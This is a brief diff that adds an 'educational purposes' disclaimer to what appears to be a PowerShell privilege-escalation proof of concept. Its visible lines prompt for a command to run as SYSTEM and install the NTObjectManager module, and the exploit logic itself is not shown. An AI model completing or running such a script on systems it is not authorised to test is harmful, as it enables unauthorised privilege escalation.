@@ -1,3 +1,4 @@
+#This PoC was made for educational purposes, use only on your own machines. I am not responsible if you misuse the script.
 $cmd = Read-Host -Prompt 'Enter the command you wish to execute as system'
 Write-Host "[*] Installing NTObjectManager..."
 install-module NTObjectManager -Scope CurrentUser -Force
